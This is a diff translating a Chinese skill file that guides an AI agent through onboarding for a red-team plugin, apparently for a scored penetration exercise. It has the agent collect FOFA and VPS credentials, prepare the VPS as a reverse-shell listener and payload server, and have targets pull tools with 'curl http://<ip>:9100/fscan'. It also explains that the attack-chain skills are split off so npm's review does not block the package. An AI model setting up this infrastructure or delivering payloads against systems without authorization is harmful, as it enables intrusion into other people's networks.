@@ -1,99 +1,100 @@
 ---
 name: redteam-setup
-description: 首次使用引导：引导提供 FOFA_KEY 与 VPS 登录方式、验证通道可用、给出降级口径（工具链由工具箱附件按需获取）
-whenToUse: 用户第一次使用红队模式时；或 redteam_preflight 报出 onboarding.incomplete / 有技能 broken 时；或用户说"环境没配好""工具装一下"
+description: First-time setup guide: guide the user to provide FOFA_KEY and VPS login method, verify channel availability, and explain fallback posture (toolchain is obtained on demand from the toolkit package)
+whenToUse: When the user uses red-team mode for the first time; or redteam_preflight reports onboarding.incomplete / broken skills; or the user says "environment not configured" / "install tools"
 role: plan
 enabled: true
 ---
 
-# 首次使用引导（把环境一次配齐）
+# First-time setup guide (configure the environment once)
 
-**触发条件**（满足任一即执行本技能，不要跳过）：
-- `redteam_preflight` 返回里 `onboarding.complete=false`；
-- preflight 有 `broken` 技能且原因是"缺环境变量"或"VPS 还是占位符"；
-- 用户第一次进红队模式、或明确说"环境/工具没配好"。
+**Trigger conditions** (execute this skill if any is met; do not skip):
+- `redteam_preflight` returns `onboarding.complete=false`;
+- preflight has `broken` skills due to "missing environment variables" or "VPS still placeholder";
+- user is entering red-team mode for the first time, or explicitly says "environment/tools not configured".
 
-**核心原则**：**一次性把话说完，一次要齐**。不要挤牙膏式反复找用户要东西——那是这套引导存在的唯一理由。
+**Core principle**: **say everything at once, ask for everything at once**. Do not ask piecemeal—that is the only reason this guide exists.
 
-## 一、先确认你有没有"工具箱"（npm 版默认没有）
+## 1. First confirm whether you have the "toolkit" (npm version does not include it by default)
 
-npm 版 `dsh-redteam-mode` **不随包分发工具安装脚本与 9 份攻击链技能**（隧道 / 凭据 /
-WebShell / 反弹 Shell / 横向移动 / 未授权利用）。原因：npm 的发布期自动审查会把
-"包在安装后自动下载渗透二进制"判定为恶意行为特征，整包会被 Blocked。
+The npm version of `dsh-redteam-mode` **does not ship tool installation scripts or the 9 attack-chain skills** (tunnel / credentials /
+webshell / reverse shell / lateral movement / unauthorized exploitation). Reason: npm's automated publish review treats
+"package automatically downloads penetration binaries after install" as malicious behavior, and the package may be blocked.
 
-- **有** `$DSH_HOME/redteam/setup.sh`（自行取过工具箱、或非 npm 安装）→ 按下面第一、二节走；
-- **没有**（`redteam_preflight` 返回里 `onboarding.setup_script.exists=false`）→ 先去项目
-  GitHub Release 下载 `dsh-redteam-mode-<版本>-toolkit.tar.gz`，解压后按其中 README
-  **由用户自己执行**，再到第三节手动配 `FOFA_KEY` 与 VPS；
-- **都不要**也行：只用本包自带的 14 个侦察/检测向技能（`fofa-recon` / `active-scan` /
-  `nuclei-scan` / `web-fingerprint` / `dir-bruteforce` 等）也能开工，只是拿不到需要落地的成果。
+- **If** `$DSH_HOME/redteam/setup.sh` exists (toolkit obtained manually, or non-npm install) → follow sections 2 and 3 below;
+- **If not** (`redteam_preflight` returns `onboarding.setup_script.exists=false`) → first download
+  `dsh-redteam-mode-<version>-toolkit.tar.gz` from the project's GitHub Release, extract it and follow its README
+  **executed by the user**, then manually configure `FOFA_KEY` and VPS in section 3;
+- **Neither is fine too**: you can start with the 14 reconnaissance/detection skills included in this package (`fofa-recon` / `active-scan` /
+  `nuclei-scan` / `web-fingerprint` / `dir-bruteforce`, etc.), but you will not be able to achieve results requiring persistence/landing.
 
-> **红线**：本插件**不替用户下载或安装任何安全工具**。需要什么，说清获取位置，由用户自己取、自己执行。
+> **Red line**: this plugin **does not download or install any security tools for the user**. State what is needed and where to obtain it; the user obtains and runs it themselves.
 
-## 二、要用户提供什么（一次列清，说清"为什么"和"给到哪"）
+## 2. What to ask the user for (ask once, explain "why" and "where it goes")
 
-| 要什么 | 为什么必须 | 给到哪 | 没有会怎样 |
+| What | Why required | Where to provide | What happens without it |
 | --- | --- | --- | --- |
-| **FOFA_KEY** | 资产测绘（`fofa-recon`）靠它铺开单位互联网资产面；没有就只能靠 crt.sh + 子域枚举，**边缘资产与未备案资产会大量漏掉** | 环境变量 `FOFA_KEY`，或写进 `$DSH_HOME/.env`（脚本会代写） | 测绘能力降级：找不全资产 → 后面四个阶段都受影响 |
-| **VPS 登录方式**（`user@ip` + 私钥路径） | 反弹 Shell 必须落到**公网可控主机**上；载荷投递、隧道中转也依赖它 | `REDTEAM_VPS_HOST`（`用户@主机`）/ `REDTEAM_VPS_KEY`（私钥路径，默认 `$DSH_HOME/redteam/toolkit/vps/id_rsa`） | 拿不到服务器权限、投递不了载荷、进不了内网 |
-| （可选）测绘平台 key | Quake / Hunter / ZoomEye 与 FOFA 结果差异大，交叉能多找出资产 | 环境变量，按需 | 少一路交叉验证 |
-| （可选）允许 apt 安装 | 补系统工具 | 用户自己执行 `sudo apt install …` | 相关技能降级 |
+| **FOFA_KEY** | Asset mapping (`fofa-recon`) depends on it to expand the organization's internet asset surface; without it you can only rely on crt.sh + subdomain enumeration, and **edge/unregistered assets will be missed significantly** | Environment variable `FOFA_KEY`, or write to `$DSH_HOME/.env` (script can write it) | Mapping capability degrades: incomplete asset discovery → all four later phases affected |
+| **VPS login method** (`user@ip` + private key path) | Reverse shells must land on a **publicly controllable host**; payload delivery and tunnel relay also depend on it | `REDTEAM_VPS_HOST` (`user@host`) / `REDTEAM_VPS_KEY` (private key path, default `$DSH_HOME/redteam/toolkit/vps/id_rsa`) | Cannot obtain server access, cannot deliver payloads, cannot enter intranet |
+| (Optional) mapping platform keys | Quake / Hunter / ZoomEye differ from FOFA results; cross-checking can find more assets | Environment variables as needed | One less cross-validation path |
+| (Optional) permission to install via apt | To add system tools | User runs `sudo apt install …` themselves | Related skills degrade |
 
-**话术要求**：列完后**等用户补齐**。不要用"我先用降级方案开工"糊过去——除非用户明确说"就按现有条件打"。
+**Communication requirement**: after listing everything, **wait for the user to provide it**. Do not gloss over with "I'll start with a degraded approach"—unless the user explicitly says "work with current conditions".
 
-**注意**：用户的 key **不要写进仓库、不要贴进报告、不要在 `redteam_chain_add` 的 `tool` 字段里出现**。
-写进 `$DSH_HOME/.env`（脚本已 `chmod 600`）即可。
+**Note**: the user's keys **must not be written into the repository, pasted into reports, or appear in the `tool` field of `redteam_chain_add`**.
+Writing them into `$DSH_HOME/.env` is sufficient (script sets `chmod 600`).
 
-### FOFA_KEY 怎么拿（要能指导用户）
-1. 登录 <https://fofa.info> → 右上角头像 → **个人中心 → API Key**；
-2. 个人版限额：10,000 次查询/月、1 秒 1 次并发（**脚本与技能都按 1 秒 1 次限速，不要调高**，超了会触发 45012 封禁）；
-3. 拿到后可以自测：`curl -s "https://fofa.info/api/v1/info/my?key=<KEY>"` —— 返回 `"error":false` 即有效。
+### How to get FOFA_KEY (be able to guide the user)
+1. Log in to <https://fofa.info> → avatar (top right) → **Personal Center → API Key**;
+2. Personal plan limits: 10,000 queries/month, 1 request/sec concurrency (**scripts and skills all rate-limit to 1 req/sec; do not increase it**, exceeding triggers 45012 ban);
+3. After obtaining, self-test: `curl -s "https://fofa.info/api/v1/info/my?key=<KEY>"` — `"error":false` means valid.
 
-### VPS 怎么准备（要能指导用户）
-- 一台**公网可达**的 Linux VPS（1 核 1G 够用），安全组放行：`22`（SSH）、`9000-9999`（反弹 Shell 监听段）、`9100`（载荷分发）；
-- 生成/放置 SSH 私钥到 `$DSH_HOME/redteam/toolkit/vps/id_rsa`，权限必须 `chmod 600`；
-- 确认连通：`ssh -i <私钥> <user>@<ip> 'echo ok'`；
-- **载荷分发服务**：VPS 上 `~/payload` 目录 + `python3 -m http.server 9100`（tmux 常驻），
-  目标机可 `curl http://<ip>:9100/fscan` 直接拉工具。
+### How to prepare VPS (be able to guide the user)
+- A **publicly reachable** Linux VPS (1 core / 1 GB is enough), with security group allowing: `22` (SSH), `9000-9999` (reverse shell listener range), `9100` (payload distribution);
+- Generate/place SSH private key at `$DSH_HOME/redteam/toolkit/vps/id_rsa` with permissions `chmod 600`;
+- Verify connectivity: `ssh -i <key> <user>@<ip> 'echo ok'`;
+- **Payload distribution service**: `~/payload` directory on VPS + `python3 -m http.server 9100` (persistent in tmux),
+  so target can pull tools directly with `curl http://<ip>:9100/fscan`.
 
-## 三、配置完的验证（必须做完才算引导成功）
+## 3. Verification after configuration (must be completed before setup is considered successful)
 
-逐项实测，**不要只看"文件存在"**：
+Test each item; **do not rely on "file exists" only**:
 
 ```bash
-# 1) FOFA key 有效
+# 1) FOFA key valid
 curl -s "https://fofa.info/api/v1/info/my?key=$FOFA_KEY" | grep -o '"error":[a-z]*'
 
-# 2) VPS 可达（载荷服务是否在跑由工具箱的体检脚本负责）
+# 2) VPS reachable (payload service liveness is checked by toolkit health script)
 ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes <user>@<ip> 'echo ok'
 
-# 3) 技能注册表可见
-#    用 redteam_preflight 复核，看 available 列表里实际有哪些技能
+# 3) Skill registry visible
+#    Recheck with redteam_preflight to see which skills are actually available
 ```
 
-> 工具二进制与 nuclei 模板库的体检由工具箱里的 `redteam-setup.sh --check` 负责
-> （npm 版不含该脚本，见第一节）。
-## 四、最后一步：写完成标记并复核
+> Health checks for tool binaries and nuclei template library are handled by `redteam-setup.sh --check` in the toolkit
+> (not included in npm version; see section 1).
 
-配置补齐后，写完成标记（有工具箱脚本时脚本 `--yes` 会自动写；没有就手动写）：
+## 4. Final step: write completion marker and recheck
+
+After configuration is complete, write the completion marker (toolkit script does this automatically with `--yes`; if not available, write manually):
 
 ```bash
 mkdir -p "$DSH_HOME/redteam" && date -Is > "$DSH_HOME/redteam/.setup-complete"
 ```
 
-然后**再跑一次 `redteam_preflight`**，确认：`onboarding.complete=true`、`broken` 为空或只剩用户明确接受降级的项。
-把最终结论按"能用什么 / 缺什么 / 缺的影响是什么"三条报给用户。
+Then **run `redteam_preflight` again** to confirm: `onboarding.complete=true`, and `broken` is empty or contains only items the user explicitly accepted as degraded.
+Report the final conclusion to the user in three points: "what works / what is missing / what impact the missing parts have".
 
-**改了 `$DSH_HOME/.env` 后必须重启 dsh web**，否则当前进程读不到新的环境变量——
-这一步要明确告诉用户（智能体不能替他重启）。
+**After modifying `$DSH_HOME/.env`, dsh web must be restarted**, otherwise the current process will not read new environment variables—
+you must clearly tell the user this (the agent cannot restart it for them).
 
-## 五、用户就是不给某些资源时（降级口径）
+## 5. When the user refuses to provide some resources (fallback posture)
 
-| 缺什么 | 降级方案 | 必须向用户说明的限制 |
+| Missing | Fallback approach | Limitation you must explain to the user |
 | --- | --- | --- |
-| FOFA_KEY | crt.sh 证书透明 + `passive-recon` + `recon-pipeline`（subfinder/ksubdomain/dnsx）+ 搜索引擎与备案信息 | **资产收集不完整**，未备案/边缘资产会漏；得分上限受影响 |
-| VPS | 只做不需要落地的成果（账号权限、数据、未授权访问、WebShell 交付） | **拿不到服务器权限、进不了内网**，`boundary`/`internal`/`central-system` 类得分点基本放弃 |
-| 系统工具（nuclei 等） | 用工具箱里的替代品（httpx/subfinder 仍在） | 漏洞发现能力大幅下降，Nday 检测基本瘫痪 |
-| 全部都没有 | 只做纯被动信息收集与资产梳理 | 明确告诉用户"这次只能做到信息收集阶段" |
+| FOFA_KEY | crt.sh certificate transparency + `passive-recon` + `recon-pipeline` (subfinder/ksubdomain/dnsx) + search engines and registration info | **Incomplete asset collection**; unregistered/edge assets will be missed; scoring ceiling affected |
+| VPS | Only pursue results that do not require persistence (account access, data, unauthorized access, webshell delivery) | **Cannot obtain server access, cannot enter intranet**; `boundary`/`internal`/`central-system` scoring points largely unavailable |
+| System tools (nuclei etc.) | Use alternatives in toolkit (httpx/subfinder still available) | Vulnerability discovery capability significantly reduced; N-day detection largely impaired |
+| Everything missing | Only passive reconnaissance and asset triage | Clearly tell the user "this run can only reach the reconnaissance phase" |
 
-**降级决定要写进汇报**：用户需要知道这次是在什么条件下打的。
+**Record degradation decisions in the report**: the user needs to know under what conditions this run was conducted.
